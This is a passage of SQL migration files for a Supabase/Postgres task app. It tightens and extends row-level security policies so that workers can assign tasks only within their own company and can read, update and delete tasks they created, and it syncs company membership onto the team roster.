-- task's OWN company (company_id must be in the worker's company_ids). It put no
-- constraint on assignee_id, so a worker could create an in-company task assigned
-- to anyone — a member of another company, or a ghost/unapproved row that still
-- exists in team_members. This tightens the worker branch of the INSERT policy so
-- the assignee must be an approved profile that shares the task's company.
--
-- Scope of this change:
--   * Only the WORKER branch is constrained. Managers (admin / supervisor /
--     construction_supervisor / sales) are unchanged — they may still assign to
--     anyone within their company, matching how they manage across a team.
--   * Assigning to YOURSELF keeps working: your own approved profile is in the
--     company, so the check passes.
--   * Only INSERT needs this. The UPDATE policy (028) already pins a worker's
--     assignee_id to themselves, so a worker cannot reassign a task to anyone
--     else after creation — there's no cross-company leak to close on update.
--
-- "Approved member of the company" uses the same semantics as elsewhere
-- (activePeople / migration 039): a profile whose `approved` is not explicitly
-- false and whose company_ids contains the task's company.
--
-- Why a SECURITY DEFINER helper: workers can't read public.profiles (RLS), so an
-- inline `exists (select 1 from profiles ...)` in the WITH CHECK would be
-- filtered to nothing for the very role we're gating. The helper runs as definer
-- to see profiles, and only ever answers a yes/no membership question.
--
-- Idempotent; transaction-wrapped.

begin;

-- Is p_member_id an approved profile that belongs to company p_company_id?
create or replace function public.assignee_in_company(p_member_id text, p_company_id text)
returns boolean
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select exists (
    select 1
    from public.profiles p
    where p.member_id = p_member_id
      and p.approved is distinct from false
      and p_company_id = any(p.company_ids)
  );
$$;

revoke all on function public.assignee_in_company(text, text) from public, anon;
grant execute on function public.assignee_in_company(text, text) to authenticated;

-- Recreate the tasks INSERT policy (supersedes 028:109) with the worker branch
-- requiring a same-company approved assignee. Developer + manager branches are
-- carried over verbatim.
drop policy if exists "role users can insert tasks" on public.tasks;
create policy "role users can insert tasks" on public.tasks
for insert to authenticated
with check (
  public.current_profile_role() = 'developer'
  or (
    company_id = any(public.current_company_ids())
    and (
      public.current_profile_role() in ('admin', 'supervisor', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'worker'
        and public.assignee_in_company(assignee_id, company_id)
      )
    )
  )
);

commit;

-- Verify (authenticated as a worker in company 'roofing'):
--   * insert a task company_id='roofing', assignee_id = an approved roofing
--     member -> succeeds.
--   * insert with assignee_id = a member of another company, or an
--     unapproved/ghost member -> rejected by RLS.
--   * insert with assignee_id = yourself -> succeeds.

-- ============================================================
-- 043_workers_read_created_tasks.sql
-- ============================================================
-- 043: Let a worker READ the tasks they created (not only ones assigned to them).
--
-- Symptom: a worker creating a task and assigning it to a TEAMMATE gets
--   "new row violates row-level security policy for table tasks"
-- even though the INSERT itself is permitted (migration 041) and every value
-- checks out. Self-assignment works; assigning to anyone else fails.
--
-- Root cause: the client inserts with RETURNING — supabase-js does
-- `.insert(row).select('updated_at')` (SupabaseDataStore._saveTasks) to capture
-- the optimistic-lock version. Postgres applies the SELECT policy to the
-- RETURNING row. The worker branch of the tasks SELECT policy (028:98) only lets
-- a worker read tasks where `assignee_id = current_member_id()`, NOT ones they
-- merely created. When a worker delegates a task (assignee = a teammate), the
-- just-inserted row is invisible to them, so RETURNING is rejected and the whole
-- statement reports as an RLS violation. (This is the exact gap migration 040's
-- comment flagged: "the tasks SELECT policy only lets a worker READ tasks
-- ASSIGNED to them, NOT ones they merely created.")
--
-- Fix: add `creator_id = current_member_id()` to the worker branch of the SELECT
-- policy — the same clause the supervisor branch (028:90) already has. A worker
-- can now read tasks they created (so INSERT...RETURNING succeeds, and delegated
-- tasks show on the creator's board too). Everything else in the policy is
-- carried over verbatim from 028; only the worker branch gains the OR.
--
-- Scope: SELECT only. INSERT stays gated by 041 (same-company approved assignee).
-- UPDATE is intentionally left unchanged so a worker still cannot reassign a task
-- after creation (041's note) — this migration only widens read visibility.
--
-- Idempotent; transaction-wrapped.

begin;

drop policy if exists "role users can read tasks" on public.tasks;
create policy "role users can read tasks" on public.tasks
for select to authenticated
using (
  public.current_profile_role() = 'developer'
  or (
    (company_id = any(public.current_company_ids()) or id = 'general-shift')
    and (
      public.current_profile_role() in ('admin', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'supervisor'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or exists (
            select 1 from public.profiles p
            where p.member_id = public.tasks.assignee_id
              and p.supervisor_id = public.current_member_id()
          )
        )
      )
      or (
        public.current_profile_role() = 'worker'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or id = 'general-shift'
        )
      )
    )
  )
);

commit;

-- Verify (as a worker who just created task X assigned to a teammate): the row is
-- now visible, so the app's `.insert(...).select('updated_at')` returns it instead
-- of tripping RLS, and the task appears on the creator's board.

-- ============================================================
-- 044_workers_delete_own_created_tasks.sql
-- ============================================================
-- 044: Let a worker DELETE the tasks they created (only their own).
--
-- Background: the tasks DELETE policy (028:182) allows only managers
-- (admin / supervisor / construction_supervisor / sales) + developer to delete,
-- scoped to their company. Workers can create+delegate tasks (041/043) but had no
-- way to remove one they made — the detail view's Delete button was hidden for
-- them and the DELETE would be RLS-rejected anyway.
--
-- Fix: add a worker branch that permits deleting a task ONLY when the worker is
-- its creator (creator_id = current_member_id()), still inside their company. A
-- worker cannot delete tasks a manager created and handed to them — just their
-- own. Mirrors the creator-scoped read added in 043.
--
-- Idempotent; transaction-wrapped.

begin;

drop policy if exists "role users can delete tasks" on public.tasks;
create policy "role users can delete tasks" on public.tasks
for delete to authenticated
using (
  public.current_profile_role() = 'developer'
  or (
    company_id = any(public.current_company_ids())
    and (
      public.current_profile_role() in ('admin', 'supervisor', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'worker'
        and creator_id = public.current_member_id()
      )
    )
  )
);

commit;

-- Verify (as a worker): deleting a task you created -> succeeds; deleting a task
-- a manager created and assigned to you -> still rejected by RLS.

-- ============================================================
-- 045_team_member_company_ids.sql
-- ============================================================
-- 045: Mirror each member's company_ids onto the team_members roster, so the
--      assignee/watcher pickers can be company-scoped for WORKERS too.
--
-- Background: pickers are built from App.PEOPLE, which a worker loads from
-- team_members (workers can't read public.profiles via RLS). team_members carried
-- no company, so utils.peopleInCompany() couldn't filter for a worker session and
-- fell back to the whole roster — a worker saw every company's people when
-- assigning, even though 041 only lets them assign within their own company.
--
-- Fix: add team_members.company_ids (text[]), backfill it from profiles, and
-- extend the existing profile->roster sync trigger (031) so company edits made via
-- the admin approval screen propagate to the roster automatically. The picker can
-- then read each person's company off the roster the worker already loads.
--
-- Note: 031's trigger was deliberately column-scoped to full_name/avatar_url so
-- company edits did NOT touch the roster. That tradeoff is now reversed — company
-- IS part of the roster's contract — so company_ids joins the trigger's column
-- list and its body. (This only mirrors data the member already owns; RLS on
-- team_members is unchanged, so it is not an authorization surface.)
--
-- Idempotent; transaction-wrapped.

begin;

------------------------------------------------------------------------
-- 1. Column (text[], same shape as profiles.company_ids after migration 042).
------------------------------------------------------------------------
alter table public.team_members
  add column if not exists company_ids text[] not null default '{}'::text[];

------------------------------------------------------------------------
-- 2. One-time backfill from profiles (identity map: profiles.member_id = team_members.id).
------------------------------------------------------------------------
update public.team_members tm
set company_ids = coalesce(p.company_ids, '{}'::text[])
from public.profiles p
where p.member_id = tm.id
  and tm.company_ids is distinct from coalesce(p.company_ids, '{}'::text[]);

------------------------------------------------------------------------
-- 3. Extend the going-forward sync trigger (031) to carry company_ids too.
------------------------------------------------------------------------
create or replace function public.sync_team_member_from_profile()
returns trigger
language plpgsql
security definer
set search_path = public, pg_temp
as $$
begin
  if new.member_id is null then
    return new;
  end if;
  update public.team_members tm
  set
    full_name   = coalesce(nullif(new.full_name, ''), tm.full_name),
    name        = coalesce(nullif(split_part(new.full_name, ' ', 1), ''), tm.name),
    avatar_url  = coalesce(new.avatar_url, tm.avatar_url),
    company_ids = coalesce(new.company_ids, '{}'::text[])
  where tm.id = new.member_id;
  return new;
end;
$$;

revoke execute on function public.sync_team_member_from_profile() from anon, authenticated, public;

-- Recreate the trigger with company_ids added to the watched column list.
drop trigger if exists sync_team_member_from_profile on public.profiles;
create trigger sync_team_member_from_profile
  after insert or update of full_name, avatar_url, company_ids on public.profiles
  for each row execute function public.sync_team_member_from_profile();

commit;

-- Verify (0 rows — every roster company list now matches the profile):
--   select tm.id, tm.company_ids, p.company_ids
--   from public.team_members tm join public.profiles p on p.member_id = tm.id
--   where tm.company_ids is distinct from coalesce(p.company_ids, '{}'::text[]);

-- ============================================================
-- 046_workers_update_created_tasks.sql
-- ============================================================
-- 046: Let a worker UPDATE the tasks they created (complete / edit a task they
--      delegated), not only tasks assigned to them.
--
-- Symptom: a worker marks a task they created+delegated as done and gets a
-- "Task updated elsewhere — refreshed to the latest version" toast, and the
-- change reverts. No error is shown.
--
-- Root cause: the client updates with an optimistic lock —
--   .update(row).eq('id', id).eq('updated_at', known).select('updated_at')
-- and treats "0 rows affected" as a concurrent-edit conflict (refetch + toast).
-- The worker branch of the tasks UPDATE policy (028:146/171) only matches rows
-- where assignee_id = current_member_id(). A delegated task (assignee = a
-- teammate) doesn't match the USING clause, so the UPDATE affects 0 rows and the
-- app reports a phantom conflict. This is the UPDATE-side twin of 043 (read) and
-- 044 (delete).
--
-- Fix: add `creator_id = current_member_id()` to the worker branch.
--   * USING gains it so a worker can target a task they created.
--   * WITH CHECK gains it guarded by assignee_in_company(assignee_id, company_id)
--     — so a worker-creator can complete/edit (and, if they reassign, only to a
--     same-company approved member, exactly as 041 gates their INSERT). A worker
--     updating a task assigned to themselves is unchanged.
--
-- Other role branches (developer / admin / supervisor) are carried over verbatim
-- from 028. Idempotent; transaction-wrapped.

begin;

drop policy if exists "role users can update tasks" on public.tasks;
create policy "role users can update tasks" on public.tasks
for update to authenticated
using (
  public.current_profile_role() = 'developer'
  or (
    (company_id = any(public.current_company_ids()) or id = 'general-shift')
    and (
      public.current_profile_role() in ('admin', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'supervisor'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or exists (
            select 1 from public.profiles p
            where p.member_id = public.tasks.assignee_id
              and p.supervisor_id = public.current_member_id()
          )
        )
      )
      or (
        public.current_profile_role() = 'worker'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or id = 'general-shift'
        )
      )
    )
  )
)
with check (
  public.current_profile_role() = 'developer'
  or (
    (company_id = any(public.current_company_ids()) or id = 'general-shift')
    and (
      public.current_profile_role() in ('admin', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'supervisor'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or exists (
            select 1 from public.profiles p
            where p.member_id = public.tasks.assignee_id
              and p.supervisor_id = public.current_member_id()
          )
        )
      )
      or (
        public.current_profile_role() = 'worker'
        and (
          assignee_id = public.current_member_id()
          or (
            creator_id = public.current_member_id()
            and public.assignee_in_company(assignee_id, company_id)
          )
          or id = 'general-shift'
        )
      )
    )
  )
);

commit;

-- Verify (as a worker): marking a task you created+delegated as done now sticks
-- (the UPDATE affects its row, no phantom conflict); reassigning it to a member of
-- another company is still rejected by the WITH CHECK.

